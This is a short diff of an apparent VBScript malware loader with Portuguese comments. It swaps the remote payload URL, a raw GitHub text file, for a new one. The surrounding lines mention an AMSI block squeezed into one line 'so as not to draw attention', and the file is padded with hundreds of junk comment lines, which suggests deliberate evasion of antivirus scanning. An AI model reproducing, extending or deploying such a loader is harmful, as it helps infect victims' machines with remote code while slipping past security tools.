@@ -571,7 +571,7 @@ End If
 ' ==============================================================================
 ' Aqui você pode alterar a URL quando quiser
 Dim urlAntigo
-urlAntigo = "https://raw.githubusercontent.com/iluminat123/lumen/refs/heads/main/xwo9999.txt"
+urlAntigo = "https://raw.githubusercontent.com/iluminat123/lumen/refs/heads/main/x66.txt"
 
 ' Bloco AMSI (Compactado em uma linha para não chamar atenção, mas é o mesmo código)
 Dim amsi
@@ -1114,4 +1114,5 @@ End Sub
 ' Lixo coment�rio extra fim 298
 ' Lixo coment�rio extra fim 299
 ' Lixo coment�rio extra fim 300
+
 
